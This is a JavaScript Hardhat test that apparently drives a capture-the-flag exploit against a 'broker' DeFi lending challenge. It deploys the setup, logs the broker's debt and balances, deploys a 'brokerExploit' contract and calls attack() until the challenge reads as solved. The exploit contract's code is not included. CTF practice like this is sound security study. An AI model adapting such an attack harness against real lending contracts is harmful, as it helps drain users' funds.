const { expect } = require("chai");
const { ethers } = require('hardhat');

describe("broker", function() {
        let attacker;
        it("should return the solved", async function(){
            [attacker] = await ethers.getSigners();

            const Setup = await ethers.getContractFactory("brokerSetup",attacker);
            const setup = await Setup.deploy({
                value: ethers.utils.parseEther("50.0")
            });

            const brokerAddr = await setup.broker();
            const broker = await ethers.getContractAt("Broker", brokerAddr, attacker);

            const wethAddr = await setup.weth();
            const weth = await ethers.getContractAt("WETH91", wethAddr, attacker);

            const tokenAddr = await setup.token();
            const token = await ethers.getContractAt("Token", tokenAddr, attacker);

            const router = await ethers.getContractAt("Router", "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", attacker)

            const pairAddr = await setup.pair();
            const pair = await ethers.getContractAt("IUniswapV2Pair", pairAddr, attacker);

            console.log("broker.debt(setup.address)",await broker.debt(setup.address))
            console.log("broker.deposited(setup.address)",await broker.deposited(setup.address))
            console.log("broker.safeDebt(setup.address)",await broker.safeDebt(setup.address))
            console.log("broker.rate()",await broker.rate())
            const wethBalance = await weth.balanceOf(brokerAddr)
            console.log("weth.balanceOf(brokerAddr)",wethBalance)
            const tokenBalance = await token.balanceOf(brokerAddr)
            console.log("token.balanceOf(brokerAddr)",tokenBalance)

            await token.airdrop()
            // await broker.connect(attacker).withdraw(21)
            console.log("weth.balanceOf(brokerAddr)",await weth.balanceOf(attacker.address))
            console.log("token.balanceOf(brokerAddr)",await token.balanceOf(attacker.address))



            const Exploit = await ethers.getContractFactory("brokerExploit",attacker);
            const exploit = await Exploit.deploy(setup.address,{
                value: ethers.utils.parseEther("50.0")
            });

            await exploit.attack()

            expect(await setup.isSolved()).to.equal(true)
        })
    }
)
